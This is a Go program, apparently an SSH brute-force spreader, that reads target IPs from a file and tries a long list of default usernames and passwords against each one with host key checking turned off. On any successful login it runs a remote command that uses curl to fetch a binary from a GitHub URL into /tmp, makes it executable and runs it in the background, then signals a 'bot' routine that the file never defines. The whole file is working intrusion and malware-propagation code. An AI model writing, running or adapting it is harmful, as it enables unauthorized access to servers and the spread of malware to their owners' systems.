package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)




func fun(ip string) {





	lista_users := []string{
                 




        "kubernetes",
        "prometheus",
        "grafana",
        "elastic",
        "logstash",
        "kibana",
        "redis",
        "mongodb",
        "cassandra",
        "rabbitmq",
        "activemq",
        "kafka",
        "zookeeper",
        "hadoop",
        "spark",
        "hive",
        "hbase",
        "oozie",
        "yarn",
        "hdfs",
        "mapred",
        "ambari",
        "cloudera",
        "hortonworks",
        "centos",
        "ubuntu",
        "debian",
        "fedora",
        "redhat",
        "suse",
        "almalinux",
        "rocky",
        "alpine",
        "arch",
        "gentoo",
        "slackware",
        "freebsd",
        "openbsd",
        "netbsd",
        "solaris",
        "hpux",
        "aix",
        "irix",
        "tru64",
        "unix",
        "root",
         "admin",
         "1234567",
         "admin12345",
          "toor",
           "test",
         "administrator",
          "marketing",
         "webadmin",
           "webmaster",
          "maintenance",
          "techsupport",
            "logon",
            "alpine",
            "ubuntu",
              "linux",
            "terminal",
             "qwerty",
             "password", 
              "password123",
                "debian",
                "guest",

		

	}

	lista_pass := []string{
               	

             "root",
            "admin",
            "1234567",
           "admin12345",
              "toor",
            "test",
        "administrator",
          "12345",
           "webadmin",
         "webmaster",
         "maintenance",
         "techsupport",
           "logon"  ,
         "alpine",
         "ubuntu",
          "linux",
          "terminal",
        "qwerty",
         "password",
         "password123",
         "debian",
         "guest",
         "k8s",
        "kubernetes",
        "prometheus",
        "grafana",
        "elastic",
        "logstash",
        "kibana",
        "redis",
        "mongodb",
        "cassandra",
        "rabbitmq",
        "activemq",
        "kafka",
        "zookeeper",
        "hadoop",
        "spark",
        "hive",
        "hbase",
        "oozie",
        "yarn",
        "hdfs",
        "mapred",
        "ambari",
        "cloudera",
        "hortonworks",
        "centos",
        "ubuntu",
        "debian",
        "fedora",
        "redhat",
        "suse",
        "almalinux",
        "rocky",
        "alpine",
        "arch",
        "gentoo",
        "slackware",
        "freebsd",
        "openbsd",
        "netbsd",
        "solaris",
        "hpux",
        "aix",
        "irix",
        "tru64",
        "unix",




}





	for _, user := range lista_users {
		for _, senha := range lista_pass {
			fmt.Println(ip)
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(senha),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         5000   * time.Millisecond,

			}




			client, err := ssh.Dial("tcp",  ip  , config)

			if err != nil {
				fmt.Println("Failed to dial: ", err)
				continue

			}

			session, err := client.NewSession()
			if err != nil {
				fmt.Println(err)
				continue

			}


er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")


              go bot( "ssh ok ")



			fmt.Println(er)

			session.Close()

			client.Close()

		}


	}

}






func main() {


file, err := os.Open("ips")


if err != nil {

fmt.Println("Erro ao abrir arquivo:", err)

return

}



scanner := bufio.NewScanner(file)

      for scanner.Scan() {


		ip := scanner.Text()


		go fun(ip)


	}




for {




time.Sleep (10 * time.Second)




}

}
